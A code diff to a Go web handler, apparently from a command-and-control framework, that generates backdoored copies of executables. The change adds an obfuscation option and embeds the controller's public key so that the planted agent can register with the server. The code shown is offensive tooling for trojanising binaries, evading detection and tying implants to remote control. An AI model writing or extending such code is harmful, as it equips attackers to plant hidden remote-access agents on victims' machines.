@@ -534,6 +534,7 @@ func (w *WebUI) handleBinaryBackdoor(rw http.ResponseWriter, r *http.Request) {
 		OutputPath  string `json:"output"`
 		ListenerURL string `json:"listener_url"`
 		AgentPath   string `json:"agent_path"`
+		Obfuscate   bool   `json:"obfuscate"`
 	}
 	json.NewDecoder(r.Body).Decode(&req)
 
@@ -545,7 +546,19 @@ func (w *WebUI) handleBinaryBackdoor(rw http.ResponseWriter, r *http.Request) {
 	if req.OutputPath == "" {
 		ext := filepath.Ext(req.InputPath)
 		base := strings.TrimSuffix(filepath.Base(req.InputPath), ext)
-		req.OutputPath = filepath.Join("build", "payloads", "backdoored", base+"_backdoored"+ext)
+		suffix := "_backdoored"
+		if req.Obfuscate {
+			suffix = "_backdoored_garbled"
+		}
+		req.OutputPath = filepath.Join("build", "payloads", "backdoored", base+suffix+ext)
+	}
+
+	// Embed server public key so agent can register
+	var serverPubKeyB64 string
+	if w.server.PubKey != nil {
+		if keyBytes, err := crypto.PublicKeyToBytes(w.server.PubKey); err == nil {
+			serverPubKeyB64 = crypto.Base64Encode(keyBytes)
+		}
 	}
 
 	cfg := payloads.BinaryBackdoorConfig{
@@ -553,6 +566,8 @@ func (w *WebUI) handleBinaryBackdoor(rw http.ResponseWriter, r *http.Request) {
 		OutputBinary: req.OutputPath,
 		ListenerURL:  req.ListenerURL,
 		AgentBinary:  req.AgentPath,
+		Obfuscate:    req.Obfuscate,
+		ServerPubKey: serverPubKeyB64,
 	}
 
 	outPath, err := payloads.BackdoorBinary(cfg)
